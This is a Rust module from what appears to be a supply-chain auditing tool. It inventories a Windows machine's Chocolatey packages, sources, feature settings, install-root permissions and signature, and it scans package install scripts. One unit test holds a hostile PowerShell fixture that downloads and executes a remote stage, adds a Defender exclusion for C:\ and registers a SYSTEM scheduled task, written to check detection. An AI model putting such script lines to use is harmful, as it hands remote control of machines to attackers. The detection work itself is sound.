//! Chocolatey backend — the machine's choco installation, its sources, and the
//! posture of its own configuration.
//!
//! Chocolatey's real risk surface is the **install script**: a choco package is
//! a PowerShell script that downloads a binary from somewhere else, usually
//! elevated. That analysis is deliberately NOT here yet — PowerShell is not a
//! language postmortem's analyzers recognise (`Lang` covers shell, not `ps1`),
//! so wiring `chocolateyInstall.ps1` into them today would scan nothing and
//! report clean. This backend covers everything around it: what choco is, where
//! it lives, who can write to it, where it fetches from, and how far its
//! configuration has drifted from a safe default.
//!
//! Everything is read through choco's own `--limit-output` mode, which is
//! pipe-delimited and locale-independent — a better surface than winget's
//! fixed-width table.

use super::*;

/// Chocolatey's canonical install root. Anywhere else is worth knowing about:
/// historically choco was installed under paths that were writable by
/// unprivileged users, which turns every elevated `choco install` into someone
/// else's code.
const DEFAULT_ROOT: &str = r"C:\ProgramData\chocolatey";

/// The community feed. A source that is not this one is not reviewed by the
/// same moderation.
const COMMUNITY_FEED: &str = "https://community.chocolatey.org/api/v2/";

/// Features whose **default** is safe, and what enabling or disabling them
/// costs. Compared against these defaults rather than against a bare
/// expectation, because `--limit-output` does not expose the config's
/// `setExplicitly` attribute — so "differs from the shipped default" is the
/// closest available reading of "somebody changed this".
///
/// `virusCheck` is deliberately absent: it is a licensed (Pro) feature, always
/// disabled on an open-source install, so reporting it would fire on every
/// free Chocolatey in existence.
const FEATURE_POLICY: &[(&str, bool, Severity, u8, &str)] = &[
    (
        "checksumFiles",
        true,
        Severity::Critical,
        50,
        "downloaded files are no longer checksummed",
    ),
    (
        "allowEmptyChecksums",
        false,
        Severity::High,
        40,
        "packages may ship no checksum at all, over plain HTTP included",
    ),
    (
        "allowGlobalConfirmation",
        false,
        Severity::Medium,
        20,
        "installs never prompt, so a package's prompts are auto-accepted",
    ),
    (
        "useRememberedArgumentsForUpgrades",
        false,
        Severity::Medium,
        20,
        "upgrades silently replay the arguments of the original install",
    ),
];

/// One row of `choco source list --limit-output`.
#[derive(Debug, Default, PartialEq, Eq)]
pub(crate) struct ChocoSource {
    pub name: String,
    pub url: String,
    pub disabled: bool,
    pub priority: i32,
}

// --- parsing ------------------------------------------------------------------

/// `choco list --limit-output` → `name|version`.
pub(crate) fn parse_packages(stdout: &str) -> Vec<(String, String)> {
    stdout
        .lines()
        .filter_map(|l| l.trim().split_once('|'))
        .filter(|(n, _)| !n.is_empty())
        .map(|(n, v)| (n.to_string(), v.trim().to_string()))
        .collect()
}

/// `choco source list --limit-output` →
/// `name|url|disabled|user|password|priority|bypassProxy|allowSelfService|adminOnly`.
///
/// Fields beyond the ones used are ignored rather than required, so a future
/// choco that appends a column does not break the read.
pub(crate) fn parse_sources(stdout: &str) -> Vec<ChocoSource> {
    stdout
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty())
        .filter_map(|l| {
            let f: Vec<&str> = l.split('|').collect();
            if f.len() < 3 || f[0].is_empty() {
                return None;
            }
            Some(ChocoSource {
                name: f[0].to_string(),
                url: f[1].to_string(),
                disabled: f[2].eq_ignore_ascii_case("true"),
                priority: f.get(5).and_then(|p| p.parse().ok()).unwrap_or(0),
            })
        })
        .collect()
}

/// `choco feature list --limit-output` → `name|Enabled|description`.
///
/// Split on the first two separators only: the description is free text and may
/// itself contain a `|`.
pub(crate) fn parse_features(stdout: &str) -> Vec<(String, bool)> {
    stdout
        .lines()
        .filter_map(|l| {
            let mut it = l.trim().splitn(3, '|');
            let name = it.next()?;
            let state = it.next()?;
            if name.is_empty() {
                return None;
            }
            Some((name.to_string(), state.eq_ignore_ascii_case("Enabled")))
        })
        .collect()
}

/// `choco config list --limit-output` → `key|value|description`.
pub(crate) fn parse_config(stdout: &str) -> Vec<(String, String)> {
    stdout
        .lines()
        .filter_map(|l| {
            let mut it = l.trim().splitn(3, '|');
            let key = it.next()?;
            let value = it.next()?;
            if key.is_empty() {
                return None;
            }
            Some((key.to_string(), value.to_string()))
        })
        .collect()
}

// --- verdicts -----------------------------------------------------------------

/// Is this source the moderated community feed? Compared on the URL, not the
/// name: a source named `chocolatey` pointing somewhere else is exactly what
/// this needs to catch.
pub(crate) fn source_is_community(s: &ChocoSource) -> bool {
    s.url.trim_end_matches('/').eq_ignore_ascii_case(COMMUNITY_FEED.trim_end_matches('/'))
}

/// Caveats for the configured sources: third-party feeds, and any feed ordered
/// ahead of the community one (priority 1 is highest; 0 means unset/last).
pub(crate) fn source_notes(sources: &[ChocoSource]) -> Vec<String> {
    let mut out = Vec::new();
    let community_priority = sources
        .iter()
        .find(|s| source_is_community(s))
        .map(|s| s.priority);
    for s in sources {
        if source_is_community(s) || s.disabled {
            continue;
        }
        out.push(format!(
            "third-party source '{}' ({}) — packages from it are not moderated by the community feed",
            s.name, s.url
        ));
        // Priority 1 is the highest; 0 means "unset", which sorts last.
        if let Some(cp) = community_priority
            && s.priority > 0
            && (cp == 0 || s.priority < cp)
        {
            out.push(format!(
                "source '{}' is resolved before the community feed (priority {} vs {cp}) — it can \
                 shadow a community package by name",
                s.name, s.priority
            ));
        }
    }
    out
}

/// Caveats for features that drift from their safe default.
pub(crate) fn feature_notes(features: &[(String, bool)]) -> Vec<String> {
    let mut out = Vec::new();
    for (name, safe_default, severity, _points, why) in FEATURE_POLICY {
        let Some((_, enabled)) = features.iter().find(|(n, _)| n == name) else {
            continue;
        };
        if enabled == safe_default {
            continue;
        }
        let state = if *enabled { "enabled" } else { "disabled" };
        out.push(format!(
            "feature {name} is {state} [{severity:?}] — {why}"
        ));
    }
    out
}

// --- inventory ----------------------------------------------------------------

/// Build the Chocolatey inventory.
pub fn choco_inventory(opts: Opts) -> Result<Inventory> {
    let _ = opts;
    let listing = run_choco(&["list", "--limit-output"]).context("running `choco list`")?;
    let pkgs = parse_packages(&listing);
    if pkgs.is_empty() {
        anyhow::bail!(
            "`choco list` returned nothing postmortem could read — refusing to report an \
             empty inventory as a clean one"
        );
    }

    let sources = run_choco(&["source", "list", "--limit-output"])
        .map(|o| parse_sources(&o))
        .unwrap_or_default();
    let repos: Vec<Repo> = sources
        .iter()
        .map(|s| Repo {
            name: s.name.clone(),
            url: s.url.clone(),
            official: source_is_community(s),
        })
        .collect();

    let deps: Vec<Dependency> = pkgs
        .iter()
        .map(|(name, version)| Dependency {
            name: name.clone(),
            version: version.clone(),
            ecosystem: Ecosystem::Choco,
            direct: true,
            scope: Scope::Prod,
            licenses: Vec::new(),
            license_source: LicenseSource::Unknown,
            resolved_url: None,
            integrity: None,
            parents: Vec::new(),
        })
        .collect();

    // The install script is where a choco package's real behaviour lives: it
    // downloads a binary from somewhere else, usually elevated. Now that
    // PowerShell is a language the analyzers recognise, it gets the same
    // treatment as a Homebrew formula or a PKGBUILD.
    let root = choco_root();
    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    for (name, _) in &pkgs {
        let code = package_scripts(&root, name);
        if code.trim().is_empty() {
            continue;
        }
        push_signal(
            &mut signals,
            name,
            SysSignal::new(
                "install-script (runs code at install)",
                Category::InstallHook,
                Severity::Info,
                0,
            ),
        );
        if unchecksummed_download(&code) {
            push_signal(
                &mut signals,
                name,
                SysSignal::new(
                    "download-without-checksum",
                    Category::Unsigned,
                    Severity::High,
                    40,
                ),
            );
        }
        for sig in super::recipe::analyze_recipe(name, &code, "ps1") {
            push_signal(&mut signals, name, sig);
        }
    }

    // Machine-wide posture. None of it belongs to a single package, so it is
    // reported as caveats.
    let mut notes = Vec::new();
    notes.extend(source_notes(&sources));
    if let Ok(f) = run_choco(&["feature", "list", "--limit-output"]) {
        notes.extend(feature_notes(&parse_features(&f)));
    }
    if let Ok(c) = run_choco(&["config", "list", "--limit-output"]) {
        for (key, value) in parse_config(&c) {
            if key == "cacheLocation" && !value.is_empty() {
                notes.push(format!(
                    "cacheLocation is redirected to '{value}' — downloads land there before \
                     they are installed, so its permissions matter as much as choco's own"
                ));
            }
        }
    }
    notes.extend(install_posture());

    let summary = format!("{} package(s)", deps.len());
    Ok(Inventory {
        manager: "choco",
        deps,
        repos,
        signals,
        summary,
        notes,
    })
}

/// Chocolatey's install root, honouring the `ChocolateyInstall` override.
fn choco_root() -> String {
    std::env::var("ChocolateyInstall").unwrap_or_else(|_| DEFAULT_ROOT.to_string())
}

/// The install code a package runs, concatenated.
///
/// A choco package's scripts live under `<root>\lib\<pkg>\`. Their names vary
/// in case on disk (`chocolateyInstall.ps1` and `chocolateyinstall.ps1` both
/// occur), so they are matched case-insensitively rather than by exact name.
/// `chocolateyBeforeModify` and the uninstall script count too: they run with
/// the same privileges as the install.
pub(crate) fn package_scripts(root: &str, pkg: &str) -> String {
    let dir = std::path::Path::new(root).join("lib").join(pkg);
    let mut code = String::new();
    for entry in walkdir::WalkDir::new(&dir)
        .max_depth(3)
        .into_iter()
        .filter_map(std::result::Result::ok)
    {
        let name = entry.file_name().to_string_lossy().to_ascii_lowercase();
        if !name.starts_with("chocolatey") || !name.ends_with(".ps1") {
            continue;
        }
        if let Ok(text) = std::fs::read_to_string(entry.path()) {
            code.push_str(&text);
            code.push('\n');
        }
    }
    code
}

/// A download whose integrity nothing pins.
///
/// Chocolatey's own helpers take a `checksum`/`checksum64`; a script that
/// fetches a URL without one has no way to notice the bytes changed, which is
/// the whole point of the community feed shipping recipes rather than binaries.
pub(crate) fn unchecksummed_download(code: &str) -> bool {
    let lower = code.to_ascii_lowercase();
    let fetches = lower.contains("$url") || lower.contains("get-chocolateywebfile");
    fetches && !lower.contains("checksum")
}

/// Where choco is installed, who can write there, and whether `choco.exe` is
/// the binary Chocolatey signed.
fn install_posture() -> Vec<String> {
    let mut out = Vec::new();
    let root = choco_root();
    if !root.eq_ignore_ascii_case(DEFAULT_ROOT) {
        out.push(format!(
            "chocolatey is installed at '{root}', not '{DEFAULT_ROOT}' [Critical] — a root \
             outside ProgramData has historically meant a path unprivileged users can write, \
             which turns every elevated install into their code"
        ));
    }

    // One PowerShell round-trip for both the ACLs and the signature.
    let script = format!(
        r"
$root = '{root}'
foreach ($p in @($root, (Join-Path $root 'bin'))) {{
  if (-not (Test-Path $p)) {{ continue }}
  foreach ($a in (Get-Acl $p).Access) {{
    if ($a.AccessControlType -ne 'Allow') {{ continue }}
    if ($a.FileSystemRights -notmatch 'FullControl|Modify|Write') {{ continue }}
    Write-Output ('ACL|' + $p + '|' + $a.IdentityReference)
  }}
}}
$exe = Join-Path $root 'choco.exe'
if (Test-Path $exe) {{
  $s = Get-AuthenticodeSignature $exe
  Write-Output ('SIG|' + $s.Status + '|' + $s.SignerCertificate.Subject)
}}
"
    );
    let Ok(raw) = powershell(&script) else {
        out.push(
            "could not read chocolatey's permissions or signature — its posture is unverified, \
             which is not the same as sound"
                .to_string(),
        );
        return out;
    };

    for line in raw.lines() {
        let f: Vec<&str> = line.trim().split('|').collect();
        match f.as_slice() {
            ["ACL", path, identity] if !identity_is_privileged(identity) => out.push(format!(
                "'{path}' is writable by '{identity}' [Critical] — anyone in that group can \
                 replace what choco runs elevated"
            )),
            ["SIG", status, subject] if !status.eq_ignore_ascii_case("Valid") => out.push(format!(
                "choco.exe signature is {status} [High] — subject: {subject}"
            )),
            _ => {}
        }
    }
    out
}

/// Identities that are *expected* to have write access to an elevated install
/// root. Anything else holding write there is the finding.
fn identity_is_privileged(identity: &str) -> bool {
    const PRIVILEGED: &[&str] = &[
        "NT AUTHORITY\\SYSTEM",
        "BUILTIN\\ADMINISTRATORS",
        "NT SERVICE\\TRUSTEDINSTALLER",
        "CREATOR OWNER",
    ];
    PRIVILEGED
        .iter()
        .any(|p| identity.eq_ignore_ascii_case(p))
}

fn run_choco(args: &[&str]) -> Result<String> {
    let out = Command::new("choco")
        .args(args)
        .output()
        .with_context(|| format!("running `choco {}`", args.join(" ")))?;
    if !out.status.success() {
        anyhow::bail!(
            "`choco {}` failed: {}",
            args.join(" "),
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}


#[cfg(test)]
mod tests {
    use super::*;

    /// Verbatim `choco list --limit-output` from the reference machine.
    const LIST: &str = "7zip.portable|26.2.0\nchocolatey|2.7.4\njq|1.8.1";

    /// Verbatim `choco source list --limit-output`: the nine pipe-delimited
    /// fields, most of them empty on a default install.
    const SOURCES: &str =
        "chocolatey|https://community.chocolatey.org/api/v2/|False|||0|False|False|False";

    /// Verbatim `choco feature list` (name and state) from a stock Chocolatey
    /// 2.7.4 — every one of the 30 features at its shipped default.
    const FEATURES: &str = "allowEmptyChecksums|Disabled\nallowEmptyChecksumsSecure|Enabled\nallowGlobalConfirmation|Disabled\nalwaysIncludeHeaders|Disabled\nautoUninstaller|Enabled\nchecksumFiles|Enabled\ndisableCompatibilityChecks|Disabled\nexitOnRebootDetected|Disabled\nfailOnAutoUninstaller|Disabled\nfailOnInvalidOrMissingLicense|Disabled\nfailOnStandardError|Disabled\nignoreInvalidOptionsSwitches|Enabled\nignoreUnfoundPackagesOnUpgradeOutdated|Disabled\nlogEnvironmentValues|Disabled\nlogValidationResultsOnWarnings|Enabled\nlogWithoutColor|Disabled\npowershellHost|Enabled\nremovePackageInformationOnUninstall|Disabled\nshowDownloadProgress|Enabled\nshowNonElevatedWarnings|Enabled\nskipPackageUpgradesWhenNotInstalled|Disabled\nstopOnFirstPackageFailure|Disabled\nuseEnhancedExitCodes|Disabled\nuseFipsCompliantChecksums|Disabled\nuseHttpCache|Enabled\nusePackageExitCodes|Enabled\nusePackageHashValidation|Disabled\nusePackageRepositoryOptimizations|Enabled\nuseRememberedArgumentsForUpgrades|Disabled\nvirusCheck|Disabled";

    #[test]
    fn packages_are_read_from_the_pipe_delimited_listing() {
        let pkgs = parse_packages(LIST);
        assert_eq!(pkgs.len(), 3);
        assert_eq!(pkgs[0], ("7zip.portable".into(), "26.2.0".into()));
        assert_eq!(pkgs[2], ("jq".into(), "1.8.1".into()));
    }

    #[test]
    fn a_source_row_keeps_only_the_fields_that_matter() {
        let s = &parse_sources(SOURCES)[0];
        assert_eq!(s.name, "chocolatey");
        assert_eq!(s.url, "https://community.chocolatey.org/api/v2/");
        assert!(!s.disabled);
        assert_eq!(s.priority, 0);
        assert!(source_is_community(s));
    }

    /// A future choco appending a column must not break the read.
    #[test]
    fn extra_source_columns_are_ignored_not_fatal() {
        let row = "chocolatey|https://community.chocolatey.org/api/v2/|False|||0|False|False|False|NEW";
        assert_eq!(parse_sources(row).len(), 1);
    }

    /// The name is not the identity: a feed calling itself `chocolatey` while
    /// pointing elsewhere is precisely what this must catch.
    #[test]
    fn a_source_is_judged_on_its_url_not_its_name() {
        let impostor = "chocolatey|https://packages.internal.corp/api/v2/|False|||0|False|False|False";
        let s = &parse_sources(impostor)[0];
        assert!(!source_is_community(s));
        assert!(source_notes(&parse_sources(impostor))[0].contains("third-party source"));
    }

    /// A disabled source cannot serve anything, so it is not a caveat.
    #[test]
    fn a_disabled_third_party_source_is_not_reported() {
        let row = "internal|https://packages.internal.corp/|True|||0|False|False|False";
        assert!(source_notes(&parse_sources(row)).is_empty());
    }

    /// Priority 1 outranks the community feed's 0, so that source resolves
    /// first and can shadow a community package by name.
    #[test]
    fn a_source_ordered_ahead_of_the_community_feed_is_called_out() {
        let rows = format!(
            "{SOURCES}\ninternal|https://packages.internal.corp/|False|||1|False|False|False"
        );
        let notes = source_notes(&parse_sources(&rows));
        assert!(
            notes.iter().any(|n| n.contains("resolved before the community feed")),
            "got {notes:?}"
        );
    }

    /// The calibration that matters: a stock Chocolatey must produce no policy
    /// caveat at all. `allowEmptyChecksumsSecure` is Enabled by default and
    /// must not be mistaken for drift.
    #[test]
    fn a_stock_chocolatey_raises_no_policy_caveat() {
        let feats = parse_features(FEATURES);
        assert_eq!(feats.len(), 30, "the fixture is the full feature set");
        assert!(feats.iter().any(|(n, e)| n == "allowEmptyChecksumsSecure" && *e));
        assert!(feature_notes(&feats).is_empty(), "got {:?}", feature_notes(&feats));
    }

    /// `virusCheck` is a licensed feature, always Disabled on an open-source
    /// install — reporting it would fire on every free Chocolatey.
    #[test]
    fn the_licensed_virus_check_is_never_reported() {
        let feats = parse_features(FEATURES);
        assert!(feats.iter().any(|(n, e)| n == "virusCheck" && !*e));
        assert!(!feature_notes(&feats).iter().any(|n| n.contains("virusCheck")));
    }

    #[test]
    fn turning_off_checksums_is_critical_and_loosening_them_is_high() {
        let off = FEATURES.replace("checksumFiles|Enabled", "checksumFiles|Disabled");
        let notes = feature_notes(&parse_features(&off));
        assert!(notes.iter().any(|n| n.contains("checksumFiles") && n.contains("Critical")));

        let empty = FEATURES.replace("allowEmptyChecksums|Disabled", "allowEmptyChecksums|Enabled");
        let notes = feature_notes(&parse_features(&empty));
        assert!(notes.iter().any(|n| n.contains("allowEmptyChecksums is enabled")));
    }

    /// The description is free text and may contain the separator itself.
    #[test]
    fn a_description_containing_a_pipe_does_not_shift_the_state() {
        let row = "checksumFiles|Enabled|Checksum files | based on package";
        assert_eq!(parse_features(row), vec![("checksumFiles".to_string(), true)]);
    }

    /// A choco package ships a recipe, not a binary: the script fetches the
    /// payload. Chocolatey's helpers take a checksum precisely so the fetched
    /// bytes can be pinned — a script that fetches without one cannot notice a
    /// substitution.
    /// The regression this whole PowerShell pass exists for.
    ///
    /// Before `Lang::PowerShell`, `analyze_recipe(..., "ps1")` staged the file
    /// and every analyzer skipped it: a hostile choco install script came back
    /// with zero findings and no error. This asserts the end-to-end path — the
    /// same call the backend makes — actually reaches the analyzers now.
    #[test]
    fn a_hostile_install_script_is_no_longer_silently_clean() {
        let hostile = "$ErrorActionPreference = 'Stop'\n\
             $p = (New-Object Net.WebClient).DownloadString('http://198.51.100.7/stage1')\n\
             Invoke-Expression $p\n\
             Add-MpPreference -ExclusionPath 'C:\\'\n\
             Register-ScheduledTask -TaskName Updater -User SYSTEM\n";
        let sigs = super::super::recipe::analyze_recipe("evil-pkg", hostile, "ps1");
        assert!(
            !sigs.is_empty(),
            "a hostile PowerShell install script must produce findings"
        );
        let labels: Vec<&str> = sigs.iter().map(|s| s.label.as_str()).collect();
        assert!(
            sigs.iter().any(|s| s.severity >= Severity::Medium),
            "and they must carry weight, got {labels:?}"
        );
    }

    /// The counterpart: the real jq recipe, which uses the official helpers and
    /// pins its hashes, must stay quiet.
    #[test]
    fn a_well_behaved_install_script_stays_quiet() {
        let benign = "$ErrorActionPreference = 'Stop'\n\
             $toolsDir = Split-Path -parent $MyInvocation.MyCommand.Definition\n\
             $checksum64 = '23cb60a1354eed6bcc8d9b9735e8c7b388cd1fdcb75726b93bc299ef22dd9334'\n\
             $packageArgs = @{ packageName = 'jq'; checksumType = 'sha256' }\n\
             Install-ChocolateyPackage @packageArgs\n";
        assert!(super::super::recipe::analyze_recipe("jq", benign, "ps1").is_empty());
    }

    #[test]
    fn a_download_with_no_checksum_is_flagged() {
        // Modelled on the real jq package's script, which does pin its hashes.
        let good = "$url = 'https://github.com/jqlang/jq/releases/download/jq-1.8.1/jq.exe'\n\
                    $checksumType = 'sha256'\n\
                    $checksum = '414ec99417830178bd2f6e77fc78b34de3b12fc6b6c3229f07038c5811307124'\n";
        assert!(!unchecksummed_download(good));

        let bad = "$url = 'https://cdn.example.test/thing.exe'\nInstall-ChocolateyPackage @args\n";
        assert!(unchecksummed_download(bad));

        // A script that downloads nothing is not a checksum problem.
        assert!(!unchecksummed_download("Write-Output 'hello'\n"));
    }

    #[test]
    fn only_privileged_identities_may_write_to_the_install_root() {
        assert!(identity_is_privileged("NT AUTHORITY\\SYSTEM"));
        assert!(identity_is_privileged("BUILTIN\\Administrators"));
        assert!(!identity_is_privileged("BUILTIN\\Users"));
        assert!(!identity_is_privileged("NT AUTHORITY\\Authenticated Users"));
        assert!(!identity_is_privileged("DESKTOP-N5AL1VF\\alice"));
    }

    #[test]
    fn a_redirected_cache_location_is_surfaced() {
        let cfg = "cacheLocation|D:\\tmp|Cache location if not TEMP folder.";
        assert_eq!(parse_config(cfg)[0].1, "D:\\tmp");
        // And the stock empty value is not a caveat.
        assert_eq!(parse_config("cacheLocation||Cache location.")[0].1, "");
    }
}
